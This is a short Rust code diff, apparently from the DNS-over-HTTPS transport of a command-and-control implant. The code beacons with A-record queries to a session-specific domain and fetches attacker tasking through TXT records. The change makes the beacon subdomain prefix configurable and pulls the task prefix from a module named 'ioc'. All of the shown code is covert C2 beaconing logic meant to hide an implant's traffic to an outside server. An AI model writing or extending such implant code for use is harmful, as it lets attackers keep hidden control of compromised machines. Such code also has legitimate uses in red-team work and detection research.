@@ -273,7 +273,7 @@ impl Transport for DohTransport {
         loop {
             // Beacon: A record query
             let beacon_domain =
-                format!("beacon.{:x}.{}", self.session_id, self.profile.host_header);
+                format!("{}.{:x}.{}", self.profile.dns_prefix, self.session_id, self.profile.host_header);
             let json = self.execute_query(&beacon_domain, "A").await?;
 
             // Check for a magic "tasking available" signal in the A record answer.
@@ -307,7 +307,7 @@ impl Transport for DohTransport {
         }
 
         // Fetch actual data via TXT record
-        let task_domain = format!("task.{:x}.{}", self.session_id, self.profile.host_header);
+        let task_domain = format!("{}.{:x}.{}", common::ioc::IOC_DNS_TASK, self.session_id, self.profile.host_header);
         let txt_json = self.execute_query(&task_domain, "TXT").await?;
 
         let answer = txt_json
